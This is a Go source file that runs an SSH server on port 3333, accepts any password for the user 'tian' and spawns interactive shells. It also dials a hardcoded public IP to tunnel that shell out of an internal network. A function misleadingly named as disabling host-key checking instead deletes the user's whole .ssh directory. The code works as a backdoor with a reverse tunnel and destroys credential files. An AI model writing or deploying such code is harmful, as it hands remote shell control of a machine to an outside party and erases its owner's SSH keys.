package main

import (
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"

	gssh "github.com/gliderlabs/ssh"
)

func startSShServer() {

	// Disable StrictHostKeyChecking
	err := disableStrictHostKeyChecking()
	if err != nil {
		log.Fatal(err)
	}
	server := &gssh.Server{
		Addr: ":3333",
		PasswordHandler: func(ctx gssh.Context, password string) bool {
			return ctx.User() == "tian"
		},
		Handler: func(s gssh.Session) {
			_, winCh, isPty := s.Pty()
			if isPty {
				handlePty(s, winCh)
			} else {
				io.WriteString(s, "non-interactive sessions aren't supported\n")
			}
		},
	}

	log.Fatal(server.ListenAndServe())
}

func handlePty(s gssh.Session, winCh <-chan gssh.Window) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "powershell"
	} else {
		shell = "/bin/sh"
	}

	cmd := exec.Command(shell)
	cmd.Env = append(cmd.Env, "TERM=xterm")

	stdout, _ := cmd.StdoutPipe()
	stdin, _ := cmd.StdinPipe()

	go func() {
		io.Copy(stdin, s)
	}()

	go func() {
		io.Copy(s, stdout)
	}()

	cmd.Start()
	cmd.Wait()
}

func disableStrictHostKeyChecking() error {
	var sshConfigPath string
	if runtime.GOOS == "windows" {
		sshConfigPath = os.Getenv("USERPROFILE") + "\\.ssh"
	} else {
		sshConfigPath = os.Getenv("HOME") + "/.ssh"
	}

	// 清空.ssh
	err := os.RemoveAll(sshConfigPath)
	if err != nil {
		return err
	}

	return nil

}

// proxy 内网穿透，端口转发
func main() {

	go func() {
		for {
			startSShServer()
		}
	}()
	// 启动FRP客户端，将公网服务器的8080端口的流量转发到内网的3333端口
	startFRPClient("47.96.225.81:8080", "localhost:3333")
}

func startFRPClient(source, target string) {
	for {
		// 连接到公网服务器
		remoteConn, err := net.Dial("tcp", source)
		if err != nil {
			log.Fatal(err)
		}

		// 连接到内网的3333端口
		localConn, err := net.Dial("tcp", target)
		if err != nil {
			log.Fatal(err)
		}

		// 将数据在这两个连接之间转发
		go io.Copy(remoteConn, localConn)
		io.Copy(localConn, remoteConn)
	}
}
